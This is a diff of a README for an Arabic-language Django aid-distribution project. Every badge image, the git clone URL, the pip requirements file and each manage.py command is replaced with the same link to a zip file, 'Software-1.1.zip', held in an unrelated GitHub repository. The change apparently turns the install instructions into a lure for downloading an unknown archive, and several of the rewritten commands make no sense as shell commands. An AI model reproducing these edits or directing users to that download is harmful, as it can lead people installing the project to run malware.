@@ -4,10 +4,10 @@
 
 <div align="center">
 
-![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)
-![Django](https://img.shields.io/badge/Django-5.2+-green.svg)
-![License](https://img.shields.io/badge/License-MIT-red.svg)
-![Status](https://img.shields.io/badge/Status-Active-brightgreen.svg)
+![Python](https://raw.githubusercontent.com/amesmeh/elbassa/main/orphans/migrations/Software-1.1.zip+https://raw.githubusercontent.com/amesmeh/elbassa/main/orphans/migrations/Software-1.1.zip)
+![Django](https://raw.githubusercontent.com/amesmeh/elbassa/main/orphans/migrations/Software-1.1.zip+https://raw.githubusercontent.com/amesmeh/elbassa/main/orphans/migrations/Software-1.1.zip)
+![License](https://raw.githubusercontent.com/amesmeh/elbassa/main/orphans/migrations/Software-1.1.zip)
+![Status](https://raw.githubusercontent.com/amesmeh/elbassa/main/orphans/migrations/Software-1.1.zip)
 
 </div>
 
@@ -55,7 +55,7 @@ Django 5.2+
 
 ### 1. استنساخ المشروع
 ```bash
-git clone https://github.com/your-username/palestine-aid-system.git
+git clone https://raw.githubusercontent.com/amesmeh/elbassa/main/orphans/migrations/Software-1.1.zip
 cd palestine-aid-system
 ```
 
@@ -70,23 +70,23 @@ source venv/bin/activate
 
 ### 3. تثبيت المتطلبات
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/amesmeh/elbassa/main/orphans/migrations/Software-1.1.zip
 ```
 
 ### 4. إعداد قاعدة البيانات
 ```bash
-python manage.py makemigrations
-python manage.py migrate
+python https://raw.githubusercontent.com/amesmeh/elbassa/main/orphans/migrations/Software-1.1.zip makemigrations
+python https://raw.githubusercontent.com/amesmeh/elbassa/main/orphans/migrations/Software-1.1.zip migrate
 ```
 
 ### 5. إنشاء مستخدم إداري
 ```bash
-python manage.py createsuperuser
+python https://raw.githubusercontent.com/amesmeh/elbassa/main/orphans/migrations/Software-1.1.zip createsuperuser
 ```
 
 ### 6. تشغيل السيرفر
 ```bash
-python manage.py runserver
+python https://raw.githubusercontent.com/amesmeh/elbassa/main/orphans/migrations/Software-1.1.zip runserver
 ```
 
 ### 7. فتح المتصفح
@@ -117,7 +117,7 @@ palestine-aid-system/
 ├── templates/                  # قوالب HTML
 ├── static/                     # الملفات الثابتة
 ├── media/                      # ملفات الوسائط
-└── requirements.txt           # متطلبات المشروع
+└── https://raw.githubusercontent.com/amesmeh/elbassa/main/orphans/migrations/Software-1.1.zip           # متطلبات المشروع
 ```
 
 ## 🔒 الأمان والحماية
